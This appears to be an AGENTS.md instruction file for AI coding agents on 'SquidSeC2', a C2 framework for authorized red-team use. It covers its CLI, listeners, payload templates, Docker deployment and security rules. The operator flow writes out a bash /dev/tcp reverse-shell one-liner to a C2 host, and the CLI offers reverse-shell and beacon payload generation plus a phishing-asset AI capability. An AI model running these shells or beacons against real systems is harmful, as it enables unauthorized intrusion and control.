# AGENTS.md — Instructions for AI Agents Working on SquidSeC2

## Project

SquidSeC2 is a lightweight, security-first, AI-native C2 for **authorized** red team / pen-test use only.

Primary language: Python 3.11+ · FastAPI · SQLite · Docker-first  
Operator CLI: `ss2` (also `squidsec2-cli`)

## Non-Negotiable Security Rules

1. **External AI restriction**: MCP tools must remain allow-listed per token. Do not add open-ended autonomous agent loops for external models.
2. **Admin AI shielding**: Never feed raw session output into LLM prompts without `sanitize_untrusted()`. Keep capabilities allow-listed.
3. **Determinism preference**: Prefer templates, fixed prompts, and single-step tools over free-form agentic planning.
4. **Audit everything**: Operator, MCP, and Admin AI actions go through the policy engine / audit trail.
5. **No secrets in git**: Tokens, API keys, `data/` contents, `admin_token.txt`, and `~/.config/squidsec2/config.json` stay out of the repository.
6. **Port flexibility**: Never hard-require ports 80 or 443 for listeners — but operators *may* use them.
7. **Authorized use only**: Do not help with unauthorized access.

## Architecture Map

```
src/squidsec2/
  main.py           # FastAPI app + lifespan
  config.py         # Settings (SQUIDSEC2_* env)
  cli.py            # Operator CLI (ss2)
  db/store.py       # SQLite schema + access
  auth/tokens.py    # Scoped tokens
  policy/engine.py  # Allow/deny, risk, HITL
  sessions/         # Beacon & shell sessions
  listeners/        # http/tcp/reverse_shell
  tasking/          # Structured tasks
  payloads/         # Deterministic templates
  mcp/server.py     # Restricted external AI tools
  ai/admin_ai.py    # Sandboxed internal AI
  api/routes.py     # REST API
  metrics/          # Counters + SSE events
  audit/            # Audit facade
```

## Operator CLI (`ss2`) — Agent Knowledge

Entry points (after `pip install -e .`):

- `ss2`
- `squidsec2-cli`

Config file (local only, never commit):

- Path: `~/.config/squidsec2/config.json`
- Keys: `url`, `token`
- Env overrides: `SQUIDSEC2_URL` / `SS2_URL`, `SQUIDSEC2_TOKEN` / `SS2_TOKEN`
- Global flags: `--url`, `--token`, `--timeout`

### Full command surface

```
ss2 login --url <base> --token <ss2_...>
ss2 config [--show-token]
ss2 health | whoami | metrics | audit [--limit N] | events | repl

ss2 sessions list [--status active|closed]
ss2 sessions get <id>
ss2 sessions close <id>

ss2 tasks list [--session <id>]
ss2 tasks get <id>
ss2 tasks create <session_id> "<command>" [--args-json '{}'] [--hitl]

ss2 listeners list
ss2 listeners create <name> <port> [--kind http|tcp|reverse_shell] [--host 0.0.0.0]
ss2 listeners start|stop|delete <id>

ss2 payloads templates
ss2 payloads generate <template> <host> <port> [--interval 5] [--raw]
# templates: http_beacon_python | http_beacon_bash | reverse_shell_bash | reverse_shell_python

ss2 shell <session_id> "<command>" [--hitl]

ss2 tokens list
ss2 tokens create <name> --scopes "a,b,c" [--mcp-tools "t1,t2"]
ss2 tokens revoke <id>

ss2 ai <capability> [--data "..."] [--llm <id>]
# capabilities: payload_template | phishing_asset | doc_generate | shell_classify | recon_assist

ss2 llm list
ss2 llm add <name> <model> [--provider openai] [--base-url URL] [--api-key KEY]

ss2 mcp tools
ss2 mcp call <name> [--args-json '{}']

ss2 policy get
ss2 policy set --json '...' | --file rules.json
```

### REPL shortcuts (`ss2 repl`)

`sessions`, `session <id>`, `tasks`, `task <session> <cmd>`, `listeners`,  
`listen <name> <kind> <port>`, `start|stop <listener_id>`,  
`payload <tpl> <host> <port>`, `metrics`, `audit`, `health`, `whoami`,  
`ai <capability> [data]`, `help`, `quit`

### Reverse-shell operator flow

1. `ss2 listeners create rev <port> --kind reverse_shell`
2. `ss2 listeners start <id>` — must show `running`
3. On authorized target: `bash -i >& /dev/tcp/<C2_HOST>/<port> 0>&1`
4. `ss2 sessions list` → find `kind: reverse_shell`
5. `ss2 shell <session_id> "whoami"`
6. Optional: `ss2 events` for `shell.connected` / `shell.output`

Beacon flow:

1. Generate HTTP beacon payload pointing at `http://HOST:8443/api/v1/implant/beacon`
2. Run payload on authorized target
3. `ss2 sessions list` → `kind: beacon`
4. `ss2 tasks create <session_id> "id"` then re-check `ss2 tasks get <task_id>`

## Deployment Knowledge (Docker)

### Critical: listener ports vs Docker networking

Listeners bind **inside the process**. With default bridge networking, only ports listed in `docker-compose.yml` `ports:` reach the host.

**Current compose uses `network_mode: host`** so reverse-shell/TCP listeners bind real host ports without republishing.

If someone switches back to bridge mode:

- API only: `8443:8443`
- Every reverse-shell/TCP port must be added under `ports:` and opened in UFW

### Privileged ports (<1024)

Container runs as non-root (`squidsec2` uid 10001). Binding 443 fails with permission denied unless the host allows unprivileged low ports:

```bash
# on droplet/host
sysctl -w net.ipv4.ip_unprivileged_port_start=0
echo "net.ipv4.ip_unprivileged_port_start=0" > /etc/sysctl.d/99-squidsec2.conf
```

### Firewall (UFW)

Open whatever listener ports operators use, plus API:

```bash
ufw allow OpenSSH
ufw allow 8443/tcp
ufw allow 443/tcp    # if using reverse shell on 443
ufw allow 4444/tcp   # optional high port
```

### Admin token bootstrap

On first start, if no admin token exists:

- Generated once
- Written to `$SQUIDSEC2_DATA_DIR/admin_token.txt` (Docker: `/data/admin_token.txt`)
- **Never commit this file**

Retrieve on droplet:

```bash
ssh -i <key> root@<droplet> 'docker exec squidsec2 cat /data/admin_token.txt'
```

### Deploy / update droplet

```bash
# from repo root (example)
rsync -az -e "ssh -i ~/.ssh/ocs_prod_deploy" \
  --exclude '.venv' --exclude 'data' --exclude '.git' \
  --exclude '__pycache__' --exclude '.pytest_cache' \
  ./ root@<droplet>:/opt/squidsec2/
ssh -i ~/.ssh/ocs_prod_deploy root@<droplet> \
  'cd /opt/squidsec2 && docker compose up -d --build --force-recreate'
```

Also: `scripts/deploy_droplet.sh <ip>`

### Lab deployment reference (non-secret)

- DigitalOcean droplet name pattern: `squidsec2-test`
- Cheap size used: `s-1vcpu-1gb` (~$6/mo)
- App path on host: `/opt/squidsec2`
- API: `http://<droplet-ip>:8443`
- Docs: `http://<droplet-ip>:8443/docs`
- Health: `GET /api/v1/health`
- MCP: `/mcp/tools`, `/mcp/call`

**Do not store live tokens, SSH private keys, or API keys in this file.**

## Auth Model (quick)

- Tokens: `ss2_<urlsafe>`
- Header: `Authorization: Bearer <token>` or `X-API-Token: <token>`
- Scopes: `admin`, `sessions:read|write`, `tasks:read|write`, `listeners:read|write`,  
  `payloads:generate`, `metrics:read`, `audit:read`, `shell:interact`, `ai:use`,  
  `mcp:connect`, `tokens:manage`, `llm:manage`, `policy:manage`, …
- External AI: requires `mcp:connect` + per-token `mcp_tools` allow-list

## Dev Commands

```bash
python -m venv .venv && source .venv/bin/activate
pip install -r requirements-dev.txt
pip install -e .
pytest -q
ruff check src tests
uvicorn squidsec2.main:create_app --factory --host 0.0.0.0 --port 8443
ss2 login --url http://127.0.0.1:8443 --token "$(cat data/admin_token.txt)"
```

Docker:

```bash
docker compose up --build -d
docker exec squidsec2 cat /data/admin_token.txt
```

## Required Agent / Project Memory Files

Keep these present and accurate:

| File | Purpose |
|------|---------|
| `AGENTS.md` | **This file** — primary agent operating memory |
| `docs/squidsec2-vision.md` | Full product vision / security architecture |
| `docs/operator-runbook.md` | Human + agent operator procedures |
| `docs/deployment.md` | Docker / DO droplet deployment notes |
| `README.md` | Public-facing quickstart |
| `SECURITY.md` | Disclosure policy |
| `.gitignore` | Blocks secrets, data, local config |
| `.env.example` | Env template without secrets |

## When Changing Code

- Keep changes small and auditable
- Add/adjust pytest coverage for auth, policy, MCP allow-lists, AI sanitization, CLI if behavior changes
- Update `docs/squidsec2-vision.md` if behavior/spec changes
- Update this `AGENTS.md` when CLI surface, deploy model, or security boundaries change
- Keep README accurate
- Do not weaken MCP tool restrictions or Admin AI sandbox without explicit human design review
- Never commit tokens, keys, or `data/` DB files

## Testing Focus

- Token scope enforcement
- MCP tool allow-list denial paths
- Policy HITL / deny thresholds
- `sanitize_untrusted` injection filtering
- Listener port bind (non-privileged ports; document privileged-port host sysctl)
- Implant beacon task poll/complete cycle
- CLI login + basic authenticated calls (no live secrets in tests)
